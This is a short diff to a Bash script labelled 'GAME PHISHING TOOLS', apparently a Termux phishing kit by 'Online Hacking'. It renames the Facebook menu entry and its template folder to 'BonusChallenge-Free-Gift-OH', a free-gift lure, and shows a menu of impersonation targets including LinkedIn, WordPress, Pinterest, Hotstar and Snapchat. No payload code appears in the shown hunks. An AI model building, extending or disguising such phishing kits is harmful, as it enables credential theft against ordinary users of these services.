@@ -4,7 +4,7 @@
 #          CREATED : ONINE HACKING           #
 #             AUTHOR: SUMAN                  #
 #         ONLINE HACKING ©2021               #
-#     EMAIL: info@onlinehacking.xyz    #
+#     EMAIL: info@onlinehacking.xyz          #
 #           GAME PHISHING TOOLS              #              
 #       created by :- s u m a n              #
 #                                            #
@@ -249,7 +249,7 @@ echo
 banner(){
 echo -e "\e[1;96m==================================================================\e[m "
 echo " "
-printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;31m[\e[0m\e[1;92m12\e[0m\e[1;31m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;31m[\e[0m\e[1;92m23\e[0m\e[1;31m] \e[0m\e[1;37;44mWordpress\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mBonusChallenge-Free-Gift-OH\e[0m           \e[1;31m[\e[0m\e[1;92m12\e[0m\e[1;31m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;31m[\e[0m\e[1;92m23\e[0m\e[1;31m] \e[0m\e[1;37;44mWordpress\e[0m\n"
 echo
 printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;31m[\e[0m\e[1;92m13\e[0m\e[1;31m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;31m[\e[0m\e[1;92m24\e[0m\e[1;31m] \e[0m\e[1;37;43mSnapchat\e[0m\n" 
 echo
@@ -319,7 +319,7 @@ ash1() {
          if [ $option = 01 ] || [ $option = 1 ]
          then
 	                    cd /data/data/com.termux/files/usr/bin/phs
-                            cd facebook/
+                            cd BonusChallenge-Free-Gift-OH/
                             echo 
 			    connection
 			    ( sleep 5 ) &> /dev/null & spin_shark
